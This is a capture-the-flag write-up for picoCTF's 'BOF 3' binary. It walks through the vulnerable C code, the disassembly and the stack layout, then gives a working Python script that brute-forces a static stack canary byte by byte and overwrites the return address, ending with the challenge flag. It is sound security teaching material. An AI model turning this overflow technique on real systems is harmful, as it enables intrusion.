# BOF 3

## Inspecting
We're given an ELF file and a C file - let's look at the code!

Firstly, we can see that there's a `vuln` function - sus.

```c
void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}
```

We can set the number of bytes we want to write to `buf` - 
there's no method of checking that it's actually below `BUFSIZE` :^)

let's disassemble with GDB to understand better:

```
Dump of assembler code for function vuln:
   0x08049461 <+0>:	endbr32 
   0x08049465 <+4>:	push   ebp
   0x08049466 <+5>:	mov    ebp,esp
   0x08049468 <+7>:	push   ebx
   0x08049469 <+8>:	sub    esp,0x94
   0x0804946f <+14>:	call   0x8049270 <__x86.get_pc_thunk.bx>
   0x08049474 <+19>:	add    ebx,0x2b8c
   0x0804947a <+25>:	mov    DWORD PTR [ebp-0xc],0x0
   0x08049481 <+32>:	mov    eax,0x804c054
   0x08049487 <+38>:	mov    eax,DWORD PTR [eax]
   0x08049489 <+40>:	mov    DWORD PTR [ebp-0x10],eax
   0x0804948c <+43>:	sub    esp,0xc
   0x0804948f <+46>:	lea    eax,[ebx-0x1f40]
   0x08049495 <+52>:	push   eax
   0x08049496 <+53>:	call   0x8049140 <printf@plt>
   0x0804949b <+58>:	add    esp,0x10
   0x0804949e <+61>:	jmp    0x80494d1 <vuln+112>
   0x080494a0 <+63>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080494a3 <+66>:	lea    edx,[ebp-0x90]
   0x080494a9 <+72>:	add    eax,edx
   0x080494ab <+74>:	sub    esp,0x4
   0x080494ae <+77>:	push   0x1
   0x080494b0 <+79>:	push   eax
   0x080494b1 <+80>:	push   0x0
   0x080494b3 <+82>:	call   0x8049130 <read@plt>
   0x080494b8 <+87>:	add    esp,0x10
   0x080494bb <+90>:	lea    edx,[ebp-0x90]
   0x080494c1 <+96>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080494c4 <+99>:	add    eax,edx
   0x080494c6 <+101>:	movzx  eax,BYTE PTR [eax]
   0x080494c9 <+104>:	cmp    al,0xa
   0x080494cb <+106>:	je     0x80494d9 <vuln+120>
   0x080494cd <+108>:	add    DWORD PTR [ebp-0xc],0x1
   0x080494d1 <+112>:	cmp    DWORD PTR [ebp-0xc],0x3f
   0x080494d5 <+116>:	jle    0x80494a0 <vuln+63>
   0x080494d7 <+118>:	jmp    0x80494da <vuln+121>
   0x080494d9 <+120>:	nop
   0x080494da <+121>:	sub    esp,0x4
   0x080494dd <+124>:	lea    eax,[ebp-0x94]
   0x080494e3 <+130>:	push   eax
   0x080494e4 <+131>:	lea    eax,[ebx-0x1f0e]
   0x080494ea <+137>:	push   eax
   0x080494eb <+138>:	lea    eax,[ebp-0x90]
   0x080494f1 <+144>:	push   eax
   0x080494f2 <+145>:	call   0x80491e0 <__isoc99_sscanf@plt>
   0x080494f7 <+150>:	add    esp,0x10
   0x080494fa <+153>:	sub    esp,0xc
   0x080494fd <+156>:	lea    eax,[ebx-0x1f0b]
   0x08049503 <+162>:	push   eax
   0x08049504 <+163>:	call   0x8049140 <printf@plt>
   0x08049509 <+168>:	add    esp,0x10
   0x0804950c <+171>:	mov    eax,DWORD PTR [ebp-0x94]
   0x08049512 <+177>:	sub    esp,0x4
   0x08049515 <+180>:	push   eax
   0x08049516 <+181>:	lea    eax,[ebp-0x50]
   0x08049519 <+184>:	push   eax
   0x0804951a <+185>:	push   0x0
   0x0804951c <+187>:	call   0x8049130 <read@plt>
   0x08049521 <+192>:	add    esp,0x10
   0x08049524 <+195>:	sub    esp,0x4
   0x08049527 <+198>:	push   0x4
   0x08049529 <+200>:	mov    eax,0x804c054
   0x0804952f <+206>:	push   eax
   0x08049530 <+207>:	lea    eax,[ebp-0x10]
   0x08049533 <+210>:	push   eax
   0x08049534 <+211>:	call   0x8049180 <memcmp@plt>
   0x08049539 <+216>:	add    esp,0x10
   0x0804953c <+219>:	test   eax,eax
   0x0804953e <+221>:	je     0x804955c <vuln+251>
   0x08049540 <+223>:	sub    esp,0xc
   0x08049543 <+226>:	lea    eax,[ebx-0x1f00]
   0x08049549 <+232>:	push   eax
   0x0804954a <+233>:	call   0x80491b0 <puts@plt>
   0x0804954f <+238>:	add    esp,0x10
   0x08049552 <+241>:	sub    esp,0xc
   0x08049555 <+244>:	push   0xffffffff
   0x08049557 <+246>:	call   0x80491c0 <exit@plt>
   0x0804955c <+251>:	sub    esp,0xc
   0x0804955f <+254>:	lea    eax,[ebx-0x1ec4]
   0x08049565 <+260>:	push   eax
   0x08049566 <+261>:	call   0x80491b0 <puts@plt>
   0x0804956b <+266>:	add    esp,0x10
   0x0804956e <+269>:	mov    eax,DWORD PTR [ebx-0x4]
   0x08049574 <+275>:	mov    eax,DWORD PTR [eax]
   0x08049576 <+277>:	sub    esp,0xc
   0x08049579 <+280>:	push   eax
   0x0804957a <+281>:	call   0x8049150 <fflush@plt>
   0x0804957f <+286>:	add    esp,0x10
   0x08049582 <+289>:	nop
   0x08049583 <+290>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08049586 <+293>:	leave  
   0x08049587 <+294>:	ret    
End of assembler dump.

```

So, let's try and find the locations of the canary and the buffer.

We know that a `memcmp` is used on canary, therefore:
```
 0x08049521 <+192>:	add    esp,0x10
   0x08049524 <+195>:	sub    esp,0x4
   0x08049527 <+198>:	push   0x4
   0x08049529 <+200>:	mov    eax,0x804c054
   0x0804952f <+206>:	push   eax
   0x08049530 <+207>:	lea    eax,[ebp-0x10]
   0x08049533 <+210>:	push   eax
   0x08049534 <+211>:	call   0x8049180 <memcmp@plt>
```
canary is at `ebp-0x10`.

And with the same logic, we see that buffer is at `ebp-0x50`.

Let's look at the memory layout:
```
[low]

buf             <----- EBP - 80

canary          <----- EBP - 16

old_ebp         <----- EBP

return_address  <----- EBP + 4

[high]
```

## Implementation

We want to do 2 things:
- overwrite the return address to the address of `win`
- to keep the canary the same

The first goal is pretty easy, we'll just overwrite `ebp+4 ` to the correct address.
The canary is constant - it doesn't change every execution, so we can try to bruteforce it!

But... we can't do a normal bruteforce - that'll take 2^32 guesses and we're over the web :/

We'll be smarter. Let's brute force each byte of the canary at a time.

```python
CANARY_SIZE = 4
MAX_ASCII = 255

def brute_force_canary():
    """
    It's known that the canary is 4 bytes long, so we'll brute force each byte separately instead of a normal brute
    force. We loop over the canary size, and the over all possible ASCII's.
    :return:
    """

    canary = str()
    for byte_index in range(CANARY_SIZE):
        for curr_char in range(MAX_ASCII):
            curr_canary = canary + chr(curr_char)
            if check_canary(curr_canary):
                canary = curr_canary
                break
    return canary
```

And we have a function for checking if the canary is correct.
We have guessing mode, in which we overwrite only until the canary 
(not old_bp and return address), and the BOF itself, in which
we know the canary and want to get the flag, then we'' overwrite the return address.

```python
base_exploit_str = "1" * 64  # Overwrite 64 bytes of local vars before canary


def check_canary(canary: str, guess_canary: bool = True):
    # Connect to pico using netcat
    conn = connect("saturn.picoctf.net", 50553)

    # Overwrite local vars + canary
    input_str = base_exploit_str + canary
    if not guess_canary:
        # Overwrite additional local vars
        input_str += "2" * 12
        # Overwrite old BP
        input_str += "3" * 4
        # Overwrite return address
        input_str = input_str.encode() + p32(0x08049336)

    log.debug("PROGRAM:")
    print(conn.recv().decode())

    # Send length and exploit string
    conn.sendline(str(len(input_str)).encode())
    print(len(input_str))
    conn.recv()
    print("Curr canary: {}\n".format(canary))
    conn.sendline(input_str)

    # Get responses from program
    resp = conn.recv().decode()
    resp2 = str()

    if guess_canary:
        resp2 = conn.recv().decode()    # To get flag if we're not guessing the canary anymore
    conn.close()

    if "Smashing" in resp:
        log.info("FAIL")
        return False
    else:
        log.info("************ SUCCESS *************")

        print(resp)
        print(resp2)
        return True

```

After many iterations, we get the correct canary:
```
[x] Opening connection to saturn.picoctf.net on port 50553
[x] Opening connection to saturn.picoctf.net on port 50553: Trying 18.217.86.78
[+] Opening connection to saturn.picoctf.net on port 50553: Done
How Many Bytes will You Write Into the Buffer?
> 
88
Curr canary: BiRd
```

And then, we'll overwrite the return address and get:
```
[x] Opening connection to saturn.picoctf.net on port 50553
[x] Opening connection to saturn.picoctf.net on port 50553: Trying 18.217.86.78
[+] Opening connection to saturn.picoctf.net on port 50553: Done
How Many Bytes will You Write Into the Buffer?
> 
88
Curr canary: BiRd

[*] Closed connection to saturn.picoctf.net port 50553
[*] ************ SUCCESS *************
Ok... Now Where's the Flag?

picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}
```